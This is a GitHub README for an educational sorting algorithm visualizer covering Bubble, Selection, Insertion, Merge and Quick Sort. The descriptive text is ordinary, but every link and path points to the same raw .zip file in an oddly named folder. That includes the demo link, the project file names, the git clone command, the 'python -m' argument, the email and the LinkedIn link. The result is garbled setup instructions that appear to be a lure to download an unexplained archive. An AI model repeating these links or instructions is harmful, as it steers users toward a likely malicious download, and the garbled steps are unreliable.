# Sorting-Algorithm-Visualizer
🎯 Interactive web-based sorting algorithm visualizer with real-time animations, statistics tracking, and educational content. Features 5 algorithms: Bubble, Selection, Insertion, Merge, and Quick Sort.


# 🎯 Sorting Algorithm Visualizer

An interactive and educational web-based visualizer for popular sorting algorithms. Watch algorithms come to life with smooth animations, real-time statistics, and comprehensive algorithm analysis.

## 🚀 Live Demo

[View Live Demo](https://raw.githubusercontent.com/anmolmishra09/Sorting_Algorithm_Visualizer/main/histophysiological/Sorting_Algorithm_Visualizer.zip) 

## ✨ Features

### 🔧 Interactive Controls
- **Algorithm Selection**: Choose from 5 different sorting algorithms
- **Array Size Control**: Adjust array size from 10 to 100 elements
- **Speed Control**: Variable animation speed (1-10x)
- **Generate New Array**: Create random datasets instantly
- **Start/Stop Controls**: Full control over the sorting process

### 📊 Real-time Statistics
- **Comparisons Counter**: Track element comparisons in real-time
- **Swaps Counter**: Monitor array element swaps
- **Execution Timer**: Measure algorithm performance
- **Live Updates**: All statistics update during visualization

### 🎨 Visual Experience
- **Color-coded Animations**: 
  - 🔵 Blue: Normal elements
  - 🟡 Yellow: Elements being swapped
  - 🟠 Orange: Elements being compared
  - 🟢 Green: Sorted elements
- **Smooth Transitions**: CSS-powered animations
- **Responsive Design**: Works on desktop, tablet, and mobile
- **Modern UI**: Glassmorphism design with gradient backgrounds

### 📚 Educational Content
- **Algorithm Descriptions**: Learn how each algorithm works
- **Time Complexity Analysis**: Big O notation for all cases
- **Space Complexity**: Memory usage information
- **Best/Average/Worst Cases**: Comprehensive complexity analysis

## 🔬 Supported Algorithms

### 1. **Bubble Sort**
- **Description**: Repeatedly steps through the list, compares adjacent elements
- **Time Complexity**: O(n²) average/worst, O(n) best
- **Space Complexity**: O(1)
- **Stable**: Yes

### 2. **Selection Sort**
- **Description**: Finds minimum element and places it at the beginning
- **Time Complexity**: O(n²) all cases
- **Space Complexity**: O(1)
- **Stable**: No

### 3. **Insertion Sort**
- **Description**: Builds sorted array one element at a time
- **Time Complexity**: O(n²) average/worst, O(n) best
- **Space Complexity**: O(1)
- **Stable**: Yes

### 4. **Merge Sort**
- **Description**: Divide-and-conquer approach with merging
- **Time Complexity**: O(n log n) all cases
- **Space Complexity**: O(n)
- **Stable**: Yes

### 5. **Quick Sort**
- **Description**: Partition-based sorting with pivot selection
- **Time Complexity**: O(n log n) average, O(n²) worst
- **Space Complexity**: O(log n)
- **Stable**: No (implementation dependent)

## 🛠️ Technologies Used

- **HTML5**: Semantic structure and accessibility
- **CSS3**: Modern styling with flexbox, grid, and animations
- **Vanilla JavaScript**: ES6+ features, async/await, classes
- **No Dependencies**: Pure web technologies only

## 📁 Project Structure

```
sorting-visualizer/
├── https://raw.githubusercontent.com/anmolmishra09/Sorting_Algorithm_Visualizer/main/histophysiological/Sorting_Algorithm_Visualizer.zip          # Main HTML structure
├── https://raw.githubusercontent.com/anmolmishra09/Sorting_Algorithm_Visualizer/main/histophysiological/Sorting_Algorithm_Visualizer.zip          # CSS styling and animations
├── https://raw.githubusercontent.com/anmolmishra09/Sorting_Algorithm_Visualizer/main/histophysiological/Sorting_Algorithm_Visualizer.zip           # JavaScript logic and algorithms
└── https://raw.githubusercontent.com/anmolmishra09/Sorting_Algorithm_Visualizer/main/histophysiological/Sorting_Algorithm_Visualizer.zip           # Project documentation
```

## 🚀 Getting Started

### Prerequisites
- A modern web browser (Chrome, Firefox, Safari, Edge)
- No additional software required!

### Installation

1. **Clone the repository**
```bash
git clone https://raw.githubusercontent.com/anmolmishra09/Sorting_Algorithm_Visualizer/main/histophysiological/Sorting_Algorithm_Visualizer.zip
```

2. **Navigate to the project directory**
```bash
cd sorting-visualizer
```

3. **Open in browser**
```bash
# Option 1: Double-click https://raw.githubusercontent.com/anmolmishra09/Sorting_Algorithm_Visualizer/main/histophysiological/Sorting_Algorithm_Visualizer.zip
# Option 2: Use a local server
python -m https://raw.githubusercontent.com/anmolmishra09/Sorting_Algorithm_Visualizer/main/histophysiological/Sorting_Algorithm_Visualizer.zip 8000
# Then open http://localhost:8000
```

### Usage

1. **Select Algorithm**: Choose your preferred sorting algorithm from the dropdown
2. **Adjust Settings**: Set array size and animation speed
3. **Generate Array**: Create a new random dataset
4. **Start Visualization**: Click "Start Sorting" to begin
5. **Observe**: Watch the algorithm work with real-time statistics
6. **Stop Anytime**: Interrupt the process if needed

## 🎓 Educational Value

This visualizer is perfect for:
- **Computer Science Students**: Understanding algorithm behavior
- **Coding Interview Prep**: Visualizing common interview topics
- **Teachers/Educators**: Demonstrating algorithm concepts
- **Self-Learning**: Interactive way to learn data structures

## 🌟 Key Learning Outcomes

- **Algorithm Efficiency**: Compare different sorting approaches
- **Time Complexity**: Understand Big O notation practically
- **Trade-offs**: Learn about time vs space complexity
- **Algorithm Selection**: When to use which sorting algorithm
- **Performance Analysis**: Real-time statistics and comparisons

## 🔧 Customization

The code is modular and easy to extend:

### Adding New Algorithms
```javascript
// Add to the algorithms object in updateAlgorithmInfo()
newAlgorithm: {
    title: 'New Sort',
    description: 'Description here',
    best: 'O(?)',
    average: 'O(?)',
    worst: 'O(?)',
    space: 'O(?)'
}

// Implement the algorithm method
async newAlgorithmSort() {
    // Your algorithm implementation
}
```

### Styling Modifications
- Colors: Modify CSS gradient variables
- Animations: Adjust transition timings
- Layout: Change flexbox/grid properties

## 📱 Browser Support

- ✅ Chrome 60+
- ✅ Firefox 55+
- ✅ Safari 12+
- ✅ Edge 79+
- ✅ Mobile browsers

Key Features for GitHub About Section: 
✅ 5 Sorting Algorithms with Animations
📊 Real-time Statistics & Performance Tracking
🎨 Modern UI with Glassmorphism Design
📱 Fully Responsive Design
🎓 Educational Content & Complexity Analysis
🚀 Pure Vanilla JavaScript (No Dependencies)

Topics:-
sorting-algorithms
data-structures
algorithm-visualization
educational-tool
javascript
css3
html5
computer-science
interactive-learning
web-development
animation
big-o-notation
coding-interview
student-resource

## 🤝 Contributing

Contributions are welcome! Here's how you can help:

1. **Fork the repository**
2. **Create a feature branch**: `git checkout -b feature/new-algorithm`
3. **Commit changes**: `git commit -m 'Add heap sort algorithm'`
4. **Push to branch**: `git push origin feature/new-algorithm`
5. **Submit a Pull Request**
   

### Contribution Ideas
- Add more sorting algorithms (Heap Sort, Radix Sort, etc.)
- Implement algorithm comparisons
- Add sound effects
- Create algorithm racing mode
- Improve mobile experience
- Add dark/light theme toggle

## 🙏 Acknowledgments

- Inspired by various algorithm visualization tools
- Built for educational purposes
- Thanks to the open-source community

## 📞 Contact

- **GitHub**: [@anmolmishra09](https://raw.githubusercontent.com/anmolmishra09/Sorting_Algorithm_Visualizer/main/histophysiological/Sorting_Algorithm_Visualizer.zip)
- **Email**: https://raw.githubusercontent.com/anmolmishra09/Sorting_Algorithm_Visualizer/main/histophysiological/Sorting_Algorithm_Visualizer.zip
- **LinkedIn**: [Anmol Mishra](https://raw.githubusercontent.com/anmolmishra09/Sorting_Algorithm_Visualizer/main/histophysiological/Sorting_Algorithm_Visualizer.zip)

---

⭐ **Star this repository** if you found it helpful!

🔗 **Share with others** who are learning algorithms!

🐛 **Report issues** to help improve the project!

---

*Made with ❤️ for the coding community codewithsidhu*
